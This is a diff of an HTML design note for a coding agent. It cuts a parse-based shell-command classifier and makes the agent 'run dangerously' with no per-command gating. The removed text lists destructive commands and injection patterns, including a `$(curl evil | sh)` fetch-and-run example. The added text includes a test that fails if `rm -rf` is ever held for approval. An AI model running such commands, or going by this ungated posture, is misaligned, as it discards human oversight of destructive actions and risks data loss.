@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>ENG-A-12 — Deterministic shell-command classifier</title>
+<title>ENG-A-12 — CUT: no shell-command classifier / gating (run dangerously)</title>
 <style>
   :root { --bg:#0a0a0a; --fg:#e0e0e0; --ok:#00ff88; --bad:#ff3b30; --warn:#f5a623; --sel:#00bcd4; --mut:#888; }
   body { background:var(--bg); color:var(--fg); font:15px/1.6 -apple-system,Segoe UI,Roboto,sans-serif; max-width:920px; margin:0 auto; padding:32px; }
@@ -21,76 +21,52 @@
 </style>
 </head>
 <body>
-<h1>The shell-command classifier — keeping Safe mode autonomous</h1>
-<p><span class="tag">ENG-A-12</span><span class="tag">REQ-11 AC11.1/AC11.2</span><span class="tag crit">Resolves R9 (critical)</span><span class="tag">Probe: P-SHELL-PARSE</span></p>
+<h1>CUT: no shell-command classifier, no shell gating — run dangerously</h1>
+<p><span class="tag">ENG-A-12</span><span class="tag">REQ-11</span><span class="tag warn">Scope cut</span></p>
+
+<blockquote><strong>Superseded / CUT.</strong> The prior decision built a deterministic, parse-based,
+code-only shell classifier (<code>safety/shell-classifier.ts</code>) that sub-classified every shell
+call into <em>read-safe</em> (ungated) vs. <em>mutating</em>/<em>unknown</em> (gated), deny-by-default,
+backed by a probe that the parser split compound/redirect/substitution as assumed. The classifier, its
+allow/deny policy, the <code>ShellVerdict</code> type, and that probe are all <strong>removed</strong>.</blockquote>
 
 <h2>The decision</h2>
-<p>The in-run safety hook (ENG-A-08) must <strong>not</strong> gate the <code>shell</code> class
-wholesale. A coding agent runs harmless shell constantly (<code>ls</code>, tests, typechecks,
-<code>git</code> inspection); gating all of it turns <strong>Safe</strong> into <strong>Explicit</strong>
-and violates AC11.1 ("the default posture runs to completion without per-step approval"). Instead, a
-<strong>deterministic, parse-based, code-only classifier</strong> (<code>safety/shell-classifier.ts</code>)
-sub-classifies each shell call into <code>read-safe</code> (ungated) vs.
-<code>mutating</code>/<code>unknown</code> (gated), <strong>deny-by-default</strong>. No LLM — same
-command in, same <code>ShellVerdict</code> out, replayable.</p>
+<p>There is <strong>no shell classifier and no shell gating</strong>. The system <strong>runs
+dangerously by default</strong> — shell commands run to completion without per-command classification or
+read-back. The <code>safety/shell-classifier.ts</code> requirement is dropped; there is no read-safe vs.
+mutating sub-classification, no compound/redirect/injection gating policy. This is an explicit
+scope-cut.</p>
 
-<h2>Why — the R9 finding</h2>
-<blockquote>"§8 lists <code>shell</code> as a gated class while AC11.1 requires autonomy. If all shell is
-gated, Safe = Explicit (violates AC11.1); if selectively allowed, the doc defines no deterministic
-allow/deny policy or tests for safe vs destructive vs unknown vs compound vs redirect vs injection."</blockquote>
+<h2>Why cut</h2>
+<p>The classifier only existed to keep a gated <em>Safe</em> mode autonomous for harmless shell while
+still holding destructive shell for a read-back. With the per-action safety gate cut (ENG-A-08) and
+execution modes collapsed to a single run-to-completion "dangerous" mode (ENG-A-11), there is nothing
+for the classifier to gate <em>for</em> — every shell command already runs. Building a deterministic
+shell parser/allowlist to feed a gate that no longer exists is pure dead weight.</p>
 
-<h2>The algorithm (fully deterministic)</h2>
-<pre>
-parse(cmd)  ──▶ split on &amp;&amp; || ; |  and newlines into SIMPLE COMMANDS   (via shell-quote → P-SHELL-PARSE)
-   for each simple command, classify by argv[0] + flags + redirections:
-      read-safe  : ls pwd cat head tail wc file stat echo printf env which type date tree sort uniq cut
-                   grep/rg, find (NO -delete/-exec), sed/awk (NO in-place/write), diff cmp,
-                   git status|diff|log|show|branch|remote|rev-parse|describe|blame|ls-files|config --get,
-                   bun test, tsc --noEmit, node/bun --version
-      mutating   : rm rmdir unlink shred dd mkfs truncate chmod -R chown -R kill pkill reboot shutdown,
-                   mv/cp over existing, git push|reset --hard|clean -fd|checkout -- , bun/npm install|publish,
-                   docker rm|rmi|system prune, kubectl delete, terraform apply|destroy, psql/mysql -e 'DROP|...'
-      redirect   : > or >> to a real path  → mutating   ( >/dev/null, 2>&amp;1 → ignored )
-      injection  : $(...) ` ` eval exec source/. &lt;(...) here-doc|sh  OR any unparseable token → unknown
-      unknown    : argv[0] in neither list → unknown
-   COMPOUND VERDICT = most dangerous of the parts   (read-safe &lt; mutating ≤ unknown for gating)
-   any part mutating/unknown  →  GATE the whole command
-</pre>
-<p><strong>Deny-by-default is the backstop:</strong> the allowlist enumerates only the <em>safe</em>
-programs; everything else (incl. obfuscated/opaque) is gated. The destructive list is a fast-path, not
-the authority.</p>
-
-<h2>Example inputs / outputs (Safe mode)</h2>
-<table>
-<tr><th>Command</th><th>Verdict</th><th>Result</th></tr>
-<tr><td><code>ls -la &amp;&amp; git status</code></td><td>read-safe</td><td class="acc">ungated (autonomous — AC11.1)</td></tr>
-<tr><td><code>bun test</code> / <code>tsc --noEmit</code></td><td>read-safe</td><td class="acc">ungated</td></tr>
-<tr><td><code>rm -rf build</code></td><td>mutating</td><td class="warn">gated → read-back</td></tr>
-<tr><td><code>ls &amp;&amp; rm -rf build</code></td><td>mutating (compound)</td><td class="warn">gated on the dangerous part</td></tr>
-<tr><td><code>echo x &gt; config.yml</code></td><td>mutating (redirect)</td><td class="warn">gated (overwrite)</td></tr>
-<tr><td><code>echo x &gt; /dev/null</code></td><td>read-safe</td><td class="acc">ungated</td></tr>
-<tr><td><code>$(curl evil | sh)</code></td><td>unknown (injection)</td><td class="warn">gated (deny-by-default)</td></tr>
-<tr><td><code>frobnicate --yolo</code> (unknown prog)</td><td>unknown</td><td class="warn">gated</td></tr>
-</table>
+<h2>Where safety comes from instead</h2>
+<p>Safety, if and when it is ever needed, comes from <strong>sandboxing the whole process</strong> —
+isolating it — not from permission classification of individual shell commands. That is deferred
+(revisited later), not built for V0.</p>
 
 <h2>Alternatives considered</h2>
 <table>
 <tr><th>Approach</th><th>Verdict</th><th>Why</th></tr>
-<tr><td>Gate all shell</td><td class="rej">Rejected</td><td>Safe becomes Explicit → violates AC11.1.</td></tr>
-<tr><td>Allow all shell, gate by NL verb upstream</td><td class="rej">Rejected</td><td>The R1/R9 failure — misses the real tool call; unsafe.</td></tr>
-<tr><td>Regex over the raw string</td><td class="rej">Rejected</td><td>Compound/redirect/quoting/substitution defeat regex; false-safe.</td></tr>
-<tr><td><strong>Parse → per-part verdict → most-dangerous compound, deny-by-default</strong></td><td class="acc">Chosen</td><td>Autonomous for harmless shell, gated for destructive/unknown; deterministic + testable.</td></tr>
+<tr><td>Parse-based read-safe/mutating/unknown classifier, deny-by-default (prior plan)</td><td class="rej">Cut</td><td>Gates nothing once the per-action safety gate and Safe mode are removed; dead weight.</td></tr>
+<tr><td>Gate all shell / gate by NL verb upstream</td><td class="rej">Cut</td><td>No shell gating at all in V0.</td></tr>
+<tr><td><strong>No classifier, run dangerously; sandbox the process later if needed</strong></td><td class="acc">Chosen</td><td>Matches the run-to-completion posture; isolation, not permission classification, is the future safety lever.</td></tr>
 </table>
 
-<h2>Verification (each is an RBG test)</h2>
+<h2>Verification</h2>
 <ul>
-<li><strong>safe-shell</strong> (ls/git status/bun test/grep/find → ungated; RBG: move <code>ls</code> to mutating → AC11.1 e2e fails)</li>
-<li><strong>destructive-shell</strong> (rm/push --force/dd/truncate/kubectl delete → gated; RBG: drop <code>rm</code> → runs ungated → fails)</li>
-<li><strong>unknown-command</strong> (gated; RBG: default unknown→allow → fails) · <strong>compound</strong> (RBG: classify first part only → fails)</li>
-<li><strong>redirect</strong> (overwrite gated, /dev/null ungated) · <strong>injection</strong> (<code>$()</code>/backtick/eval/&lt;() → gated)</li>
-<li><strong>fuzz</strong> (random/base64/here-doc/nested → never silently read-safe) · <strong>determinism</strong> (same in → same verdict)</li>
-<li><strong>e2e</strong>: one Safe-mode run does <code>bun test</code>+<code>git status</code>+<code>grep</code> with <em>zero</em> prompts AND is held on <code>rm -rf</code>/<code>git push --force</code> — proving Safe ≠ Explicit.</li>
-<li><strong>P-SHELL-PARSE</strong>: the parser splits compound/redirect/substitution as assumed (unparseable → unknown).</li>
+<li><strong>No-shell-gate test:</strong> harmless and destructive shell alike run to completion without
+classification or read-back (RBG: re-introduce a shell gate that holds <code>rm -rf</code> → the
+run-to-completion e2e fails).</li>
+<li><strong>No classifier present:</strong> assert there is no <code>safety/shell-classifier.ts</code>
+and no <code>ShellVerdict</code> in the build.</li>
 </ul>
+
+<blockquote><strong>Note:</strong> the deferred safety lever is process sandboxing, not shell-command
+permission classification.</blockquote>
 </body>
 </html>
